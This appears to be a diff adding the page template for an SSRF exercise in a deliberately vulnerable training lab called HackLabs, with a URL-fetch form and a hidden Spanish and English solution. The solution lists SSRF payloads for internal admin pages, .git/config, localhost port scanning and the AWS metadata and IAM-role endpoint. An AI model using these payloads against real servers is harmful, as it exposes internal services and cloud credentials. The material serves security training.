@@ -1,0 +1,88 @@
+{% extends "base.html" %}
+{% block title %}SSRF – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <form method="GET" action="/ssrf" class="space-y-3">
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Target URL</label>
+        <input type="text" name="url" value="{{ url | e }}" placeholder="http://127.0.0.1:5000/api/users"
+               class="hl-input font-mono" />
+      </div>
+      <div class="flex flex-wrap gap-2">
+        {% for u in [
+          'http://127.0.0.1:5000/api/users',
+          'http://127.0.0.1:5000/admin',
+          'http://127.0.0.1:5000/.git/config',
+          'http://169.254.169.254/latest/meta-data/'
+        ] %}
+        <a href="/ssrf?url={{ u | urlencode }}"
+           class="text-xs px-2 py-1 rounded font-mono border border-gray-200 dark:border-gray-700 text-gray-500 dark:text-gray-400 hover:border-primary dark:hover:border-primary transition" style="color:inherit">{{ u }}</a>
+        {% endfor %}
+      </div>
+      <button type="submit" class="btn-primary">Fetch</button>
+    </form>
+  </div>
+
+  {% if error %}
+  <div class="alert-error mb-4 text-xs font-mono">{{ error }}</div>
+  {% endif %}
+  {% if content %}
+  <div class="hl-card mb-4">
+    <div class="text-xs font-mono mb-2" style="color:var(--hl-primary)">Response from: {{ url }}</div>
+    <pre class="text-gray-700 dark:text-gray-300 text-xs whitespace-pre-wrap max-h-80 overflow-y-auto">{{ content }}</pre>
+  </div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>El endpoint <code>/ssrf?url=...</code> realiza peticiones HTTP a cualquier URL sin validar.</li>
+      <li>Accede a recursos internos no expuestos al exterior:</li>
+    </ol>
+    <pre>http://127.0.0.1:5000/api/users       # API interna
+http://127.0.0.1:5000/admin           # Panel admin
+http://127.0.0.1:5000/.git/config     # Config git interna</pre>
+    <ol start="3">
+      <li>Escanea puertos internos (observa diferencias en los mensajes de error):</li>
+    </ol>
+    <pre>http://localhost:22       # SSH
+http://localhost:3306     # MySQL
+http://localhost:6379     # Redis</pre>
+    <ol start="4">
+      <li>En entornos cloud, accede a metadata del servidor:</li>
+    </ol>
+    <pre>http://169.254.169.254/latest/meta-data/          # AWS
+http://169.254.169.254/latest/meta-data/iam/      # AWS IAM roles</pre>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>The <code>/ssrf?url=...</code> endpoint makes HTTP requests to any URL without validation.</li>
+      <li>Access internal resources not exposed externally:</li>
+    </ol>
+    <pre>http://127.0.0.1:5000/api/users       # internal API
+http://127.0.0.1:5000/admin           # admin panel
+http://127.0.0.1:5000/.git/config     # internal git config</pre>
+    <ol start="3">
+      <li>Scan internal ports (observe differences in error messages):</li>
+    </ol>
+    <pre>http://localhost:22       # SSH
+http://localhost:3306     # MySQL
+http://localhost:6379     # Redis</pre>
+    <ol start="4">
+      <li>In cloud environments, access server metadata:</li>
+    </ol>
+    <pre>http://169.254.169.254/latest/meta-data/          # AWS
+http://169.254.169.254/latest/meta-data/iam/      # AWS IAM roles</pre>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span></div>
+  </div>
+</div>
+{% endblock %}
